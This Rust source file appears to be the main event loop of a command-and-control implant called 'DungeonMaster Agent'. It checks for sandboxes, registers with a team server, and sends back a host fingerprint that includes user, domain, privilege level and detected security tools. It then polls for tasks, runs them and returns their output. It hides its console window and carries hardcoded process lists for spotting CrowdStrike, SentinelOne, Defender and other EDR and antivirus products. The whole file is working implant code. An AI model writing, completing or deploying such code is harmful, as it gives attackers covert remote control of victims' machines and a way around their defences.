//! DungeonMaster Agent — core event loop
//!
//! Architecture:
//!   main() → register() → poll loop:
//!     1. sleep with jitter
//!     2. heartbeat poll (GET /c)
//!     3. if kill signal: cleanup and exit
//!     4. for each task: dispatch to executor, collect output
//!     5. submit output (POST /c)
//!
//! All network I/O goes through the Channel trait so the underlying
//! transport (HTTPS, DNS, SMB) is swappable without touching this file.

#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod channel;
mod crypto;
mod evasion;
mod executor;
mod task;

use std::time::Duration;

use crate::channel::Channel;

// Build-time constants injected by the build service via build.rs
const C2_HOST:       &str = env!("DM_C2_HOST");
const C2_PORT:       &str = env!("DM_C2_PORT");
const PATH_POLL:     &str = env!("DM_C2_PATH_POLL");
const PATH_REGISTER: &str = env!("DM_C2_PATH_REG");
const CAMPAIGN_ID:   &str = env!("DM_CAMPAIGN_ID");
const BUILD_UUID:    &str = env!("DM_BUILD_UUID");
const SLEEP_SECS:    u64  = const_parse_u64(env!("DM_SLEEP_SECS"));
const JITTER_PCT:    u64  = const_parse_u64(env!("DM_JITTER_PCT"));

fn main() {
    // Run pre-flight evasion checks before doing anything visible
    if evasion::abort_if_sandboxed() {
        return;
    }

    let mut ch = channel::https::HttpsChannel::new(C2_HOST, C2_PORT);

    // Register with the team server and get session credentials
    let session = match register(&mut ch) {
        Ok(s) => s,
        Err(_) => return, // silent failure — no output, no crash
    };

    // Main polling loop
    let mut sleep = SLEEP_SECS;
    let mut jitter = JITTER_PCT;

    loop {
        thread_sleep_with_jitter(sleep, jitter);

        // Evasion monitor: check if our environment changed
        if evasion::should_abort() {
            return;
        }

        let poll = match ch.poll(&session, PATH_POLL) {
            Ok(p) => p,
            Err(_) => continue, // network failure — retry next cycle
        };

        // Update sleep config if server changed it
        if poll.sleep_seconds > 0 {
            sleep  = poll.sleep_seconds;
            jitter = poll.jitter_pct;
        }

        if poll.kill {
            evasion::cleanup();
            return;
        }

        for task in poll.tasks {
            let output = executor::run(&task);
            let evasion_event = output.evasion_detected;

            let _ = ch.submit_output(
                &session,
                PATH_POLL,
                &task.id,
                output.data,
                output.success,
                evasion_event,
                output.evasion_description.unwrap_or_default(),
            );
        }
    }
}

// --- Registration -----------------------------------------------------------

struct Session {
    id:            String,
    server_pubkey: Vec<u8>,
    session_key:   [u8; 32], // derived AES-256 key for encrypting traffic
}

fn register(ch: &mut impl Channel) -> Result<Session, ()> {
    let reg_req = build_registration_request();
    let resp = ch.register(&reg_req, PATH_REGISTER).map_err(|_| ())?;

    // Derive shared session key via ECDH
    let session_key = crypto::derive_session_key(&resp.server_pubkey).map_err(|_| ())?;

    Ok(Session {
        id: resp.session_id,
        server_pubkey: resp.server_pubkey,
        session_key,
    })
}

fn build_registration_request() -> task::RegisterRequest {
    let fp = fingerprint::collect();
    task::RegisterRequest {
        build_id:     BUILD_UUID.to_string(),
        campaign_id:  CAMPAIGN_ID.to_string(),
        hostname:     fp.hostname,
        username:     fp.username,
        domain:       fp.domain,
        ip_internal:  fp.ip_internal,
        os:           fp.os,
        arch:         fp.arch,
        os_version:   fp.os_version,
        is_elevated:  fp.is_elevated,
        process_name: fp.process_name,
        pid:          fp.pid,
        edr_detected: fp.edr_detected,
        av_detected:  fp.av_detected,
        pubkey:       crypto::agent_pubkey_bytes().to_vec(),
    }
}

// --- Sleep with jitter ------------------------------------------------------

fn thread_sleep_with_jitter(sleep_secs: u64, jitter_pct: u64) {
    let jitter_range = ((sleep_secs * jitter_pct) / 100) as i64;
    let offset: i64 = if jitter_range > 0 {
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as i64;
        (seed % (jitter_range * 2)) - jitter_range
    } else {
        0
    };
    let actual = ((sleep_secs as i64) + offset).max(1) as u64;
    std::thread::sleep(Duration::from_secs(actual));
}

// --- Compile-time u64 parse -------------------------------------------------

const fn const_parse_u64(s: &str) -> u64 {
    let bytes = s.as_bytes();
    let mut result: u64 = 0;
    let mut i = 0;
    while i < bytes.len() {
        let digit = bytes[i] - b'0';
        result = result * 10 + digit as u64;
        i += 1;
    }
    result
}

// --- Environment fingerprint ----------------------------------------------------------------

mod fingerprint {
    pub struct Fingerprint {
        pub hostname:     String,
        pub username:     String,
        pub domain:       String,
        pub ip_internal:  String,
        pub os:           String,
        pub arch:         String,
        pub os_version:   String,
        pub is_elevated:  bool,
        pub process_name: String,
        pub pid:          i32,
        pub edr_detected: Vec<String>,
        pub av_detected:  Vec<String>,
    }

    pub fn collect() -> Fingerprint {
        Fingerprint {
            hostname:     hostname(),
            username:     username(),
            domain:       domain(),
            ip_internal:  ip_internal(),
            os:           os_name(),
            arch:         arch(),
            os_version:   os_version(),
            is_elevated:  is_elevated(),
            process_name: process_name(),
            pid:          std::process::id() as i32,
            edr_detected: detect_edr(),
            av_detected:  detect_av(),
        }
    }

    #[cfg(target_os = "windows")]
    fn hostname() -> String {
        std::env::var("COMPUTERNAME").unwrap_or_default()
    }
    #[cfg(not(target_os = "windows"))]
    fn hostname() -> String {
        std::env::var("HOSTNAME").unwrap_or_default()
    }

    fn username() -> String {
        std::env::var("USERNAME")
            .or_else(|_| std::env::var("USER"))
            .unwrap_or_default()
    }

    fn domain() -> String {
        std::env::var("USERDOMAIN").unwrap_or_default()
    }

    fn ip_internal() -> String {
        // UDP connect doesn't send traffic — just routes the socket to determine the local address
        std::net::UdpSocket::bind("0.0.0.0:0")
            .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
            .map(|a| a.ip().to_string())
            .unwrap_or_else(|_| String::from("0.0.0.0"))
    }

    fn os_name() -> String { std::env::consts::OS.to_string() }
    fn arch()    -> String { std::env::consts::ARCH.to_string() }

    #[cfg(target_os = "windows")]
    fn os_version() -> String {
        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        use windows_sys::Win32::System::SystemInformation::OSVERSIONINFOEXW;
        type RtlGetVersionFn = unsafe extern "system" fn(*mut OSVERSIONINFOEXW) -> i32;
        unsafe {
            let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
            if ntdll == 0 { return String::new(); }
            let func = match GetProcAddress(ntdll, b"RtlGetVersion\0".as_ptr()) {
                Some(f) => std::mem::transmute::<_, RtlGetVersionFn>(f),
                None    => return String::new(),
            };
            let mut info: OSVERSIONINFOEXW = std::mem::zeroed();
            info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOEXW>() as u32;
            if func(&mut info) != 0 { return String::new(); }
            format!("{}.{}.{}", info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber)
        }
    }
    #[cfg(not(target_os = "windows"))]
    fn os_version() -> String { String::new() }

    #[cfg(target_os = "windows")]
    fn is_elevated() -> bool {
        use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
        use windows_sys::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
        unsafe {
            let mut token: HANDLE = 0;
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }
            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut returned_size = 0u32;
            let ok = GetTokenInformation(
                token,
                TokenElevation,
                &mut elevation as *mut _ as *mut _,
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut returned_size,
            );
            CloseHandle(token);
            ok != 0 && elevation.TokenIsElevated != 0
        }
    }
    #[cfg(not(target_os = "windows"))]
    fn is_elevated() -> bool { unsafe { libc::geteuid() == 0 } }

    fn process_name() -> String {
        std::env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default()
    }

    #[cfg(target_os = "windows")]
    fn detect_edr() -> Vec<String> {
        const EDR: &[&str] = &[
            "csagent.exe", "csfalconservice.exe",           // CrowdStrike
            "sentinelagent.exe", "sentineld.exe",            // SentinelOne
            "cbagent.exe", "cbtool.exe",                    // Carbon Black
            "cyserver.exe", "cympprocess.exe",               // Cortex XDR
            "cylancesvc.exe",                                // Cylance
            "mssense.exe", "sensecncproxy.exe",             // Defender ATP / MDE
            "elastic-agent.exe", "elastic-endpoint.exe",    // Elastic
            "taniumclient.exe",                              // Tanium
        ];
        crate::evasion::enum_process_names()
            .into_iter()
            .filter(|n| EDR.contains(&n.as_str()))
            .collect()
    }
    #[cfg(not(target_os = "windows"))]
    fn detect_edr() -> Vec<String> { vec![] }

    #[cfg(target_os = "windows")]
    fn detect_av() -> Vec<String> {
        const AV: &[&str] = &[
            "msmpeng.exe", "mpcmdrun.exe",                  // Windows Defender
            "avp.exe", "ksde.exe",                          // Kaspersky
            "bdagent.exe", "bdwtxag.exe",                   // BitDefender
            "ekrn.exe", "egui.exe",                         // ESET
            "malwarebytes.exe", "mbam.exe",                 // Malwarebytes
            "avastsvc.exe", "avastui.exe",                  // Avast
            "avgsvc.exe", "avgui.exe",                      // AVG
            "mcshield.exe", "mfefire.exe",                  // McAfee
            "savservice.exe",                               // Sophos
            "tmbmsrv.exe", "ntrtscan.exe",                  // Trend Micro
        ];
        crate::evasion::enum_process_names()
            .into_iter()
            .filter(|n| AV.contains(&n.as_str()))
            .collect()
    }
    #[cfg(not(target_os = "windows"))]
    fn detect_av() -> Vec<String> { vec![] }
}
